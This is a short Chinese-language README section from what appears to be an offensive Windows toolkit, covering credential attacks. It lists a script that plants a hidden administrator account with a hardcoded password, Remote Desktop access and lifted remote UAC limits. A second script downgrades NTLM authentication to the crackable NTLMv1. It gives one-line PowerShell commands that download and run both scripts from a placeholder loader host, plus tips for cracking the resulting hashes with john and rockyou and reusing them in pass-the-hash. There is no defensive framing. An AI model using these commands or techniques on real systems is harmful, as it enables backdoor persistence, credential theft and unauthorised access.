# 凭据面

| 文件 | 用途 |
|---|---|
| `backdoor_user.ps1` | 建隐藏管理员 `svc_diag$ / P@ssw0rd!2024`（含远程桌面组 + UAC 远程解除） |
| `ntlm_downgrade.ps1` | LmCompatibilityLevel 降级（2=NTLMv1 可破 / 5=恢复） |

```powershell
irm http://LOADER_IP:8090/credentials/backdoor_user.ps1 | iex
irm http://LOADER_IP:8090/credentials/ntlm_downgrade.ps1 | iex -Level 2
```

攻防要点：
- NTLMv2 强度高、CPU 破解近乎无望；把目标降到 **NTLMv1** 后用 `john --format=netntlm` + rockyou 分钟级出结果，破出的是 NT hash，可直接 PtH。
- 若目标策略为默认 `LmCompatibilityLevel=3`，**远程无法降级**（本仓库在 Win10/11 实测确认），必须本地改注册表。
